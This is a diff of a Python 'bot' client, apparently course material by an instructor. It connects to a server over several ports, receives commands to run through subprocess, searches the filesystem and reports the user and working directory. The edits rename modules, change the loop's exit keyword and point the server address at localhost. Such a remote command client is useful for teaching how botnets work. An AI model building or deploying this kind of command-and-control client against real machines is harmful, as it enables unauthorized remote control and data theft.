@@ -1,16 +1,17 @@
 ################################
-## Name: Robert Hendrickson
-## ID:   instructor05
-## CREATED: 10-07-2021
-## UPDATED: 11-10-2021--06:01AM
-## FILE: happy_bot.py
+## NAME:     Robert Hendrickson
+## ID:       instructor05
+## CREATED:  10-07-2021
+## UPDATED:  11-16-2021:21:20
+## FILE:     hapy_bot.py
+## VERSION:  2.0
 ################################
 """
 This program will create a bot and call to a server for commands
-USAGE: ~$ python3 happy_bot.py
+USAGE: ~$ python3 hapy_bot.py
 socket module used for send/receive to server
 subprocess module used to send commands to system
-re module/happy_search used to find files on system
+re module/hapy_serch used to find files on system
 os module used to walk through filesystem
 getpass module required to get the username of the client connection
 sys module used for exit and sys.platform
@@ -136,15 +137,15 @@ def search(socket, delimiter):
     # tell server we are initializing the search routine
     data = '{}[!]{} Starting Search'.format(magenta, stop).encode()
     mysendall(socket, data, delimiter)
-    # we will check the current directory for the happy_search module
+    # we will check the current directory for the hapy_serch module
     if 'search' not in os.listdir():
         # now we we add the starting location to path the script is running from
         sys.path.append(start_loc)
         # Now we import the search
-        import happy_search
+        import hapy_serch
     else:
         # If the file is in the dir listing import the file
-        import happy_search
+        import hapy_serch
     # First we will receive the filepath from the server
     filepath = myrecvall(socket, delimiter).decode()
     # Now we will send that we received the file path to start the search
@@ -174,7 +175,7 @@ def search(socket, delimiter):
         myrecvall(socket, delimiter).decode()
     # We will save the results of the search function to a variable
     try:
-        results = happy_search.searcher(filepath, known, name, sys.platform)
+        results = hapy_serch.searcher(filepath, known, name, sys.platform)
     except Exception as e:
         # If an exception occurs we send the error to the server
         typee = str(type(e)).split()[1].split('>')[0]
@@ -259,7 +260,7 @@ def multi(socket, delimiter):
     This will run commands in a loop
     """
     command = ''
-    while command != 'bk':
+    while command != 'back':
         user = getpass.getuser()
         user_dir = os.getcwd()
         data = user+';'+user_dir
@@ -269,7 +270,7 @@ def multi(socket, delimiter):
         # We receive a command, then if it matches a key word
         # complete the appropriate action
         command = myrecvall(socket, delimiter).decode()
-        if command[:4] == 'bk':
+        if command[:4] == 'back':
             break
         else:
             commandant(socket, delimiter)
@@ -490,7 +491,7 @@ def main():
         print('Finalizing Update....')
 
     # This is setting up the client to communicate with the server
-    ip = '192.168.86.27'
+    ip = '127.0.0.1'# '192.168.86.27'
     ports = [8888, 7777, 6666, 5555]
     delimiter = b'!!@@##$$!!'
     # This is the socket object that will connect to the server
